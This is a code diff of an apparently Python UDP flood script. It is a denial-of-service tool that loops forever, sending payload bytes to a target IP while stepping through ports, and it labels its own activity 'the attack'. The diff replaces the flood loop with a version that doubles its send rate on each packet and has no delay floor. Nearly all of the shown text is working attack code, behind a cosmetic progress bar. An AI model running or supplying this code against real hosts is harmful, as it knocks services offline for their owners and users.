@@ -78,49 +78,33 @@ progress_steps = [
     "[##################  ]", "[################### ]", "[####################]"
 ]
 
-# Synchronous loading bar animation simulation loop
-print(f"Connecting to target {target_ip} on port {target_port}...\n")
-for step_idx, step_frame in enumerate(progress_steps):
-    completion_percentage = int((step_idx + 1) / len(progress_steps) * 100)
-    formatted_frame = step_frame.replace("[", f"[{VERDE}").replace("]", f"{RESET}]")
-    sys.stdout.write(f"\r{formatted_frame} {completion_percentage}%")
+for i, progress in enumerate(progress_chars):
+    percentage = int((i + 1) / len(progress_chars) * 100)
+    sys.stdout.write("\r" + progress.replace("[", "[" + VERDE).replace("]", RESET + "]") + f" {percentage}%")
     sys.stdout.flush()
-    time.sleep(0.04)
+    time.sleep(0.5)
 
-print("\n\n[+] Status: Interface initialized successfully.")
-time.sleep(1)
+time.sleep(3)
 
-# Operation variable initial state metrics
-packets_transmitted = 0
-acceleration_rate = 0.1
-multiplication_factor = 1.05
+sent = 0
+
+base_rate = 0.1
+exponential_factor = 2
 
 try:
     while True:
-        # Commit transactional UDP network data payload transfer
-        sock.sendto(attack_bytes, (target_ip, target_port))
-        packets_transmitted += 1
-        
-        print(f"Sent {packets_transmitted} packet to {target_ip} through port:{target_port}")
-        
-        # Sequentially cycle port destination array bounds
-        target_port += 1
-        if target_port > 65535:
-            target_port = 1
+        sock.sendto(attack_bytes, (ip, port))
+        sent = sent + 1
+        port = port + 1
+        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
+        if port == 65534:
+            port = 1
 
-        # Smooth transaction throttle calculation 
-        acceleration_rate *= multiplication_factor
-        calculated_delay = 1 / acceleration_rate
+        base_rate *= exponential_factor
 
-        # Lower-bound guard to shield loop thread from registry execution crash
-        if calculated_delay > 0.0002:
-            time.sleep(calculated_delay)
-        else:
-            time.sleep(0.0002)
+        time.sleep(1 / base_rate)
 
 except KeyboardInterrupt:
-    print("\n" + ROJO + "[*] User interrupted the attack operation." + RESET)
-except socket.gaierror:
-    print("\n" + ROJO + "[-] Network Error: Failed to resolve the target host identifier name." + RESET)
-except Exception as error_msg:
-    print(f"\nRuntime Error: {error_msg}")
+    print("\n" + ROJO + "[*] User interrupted the attack." + RESET)
+except Exception as e:
+    print(f"Error: {e}")
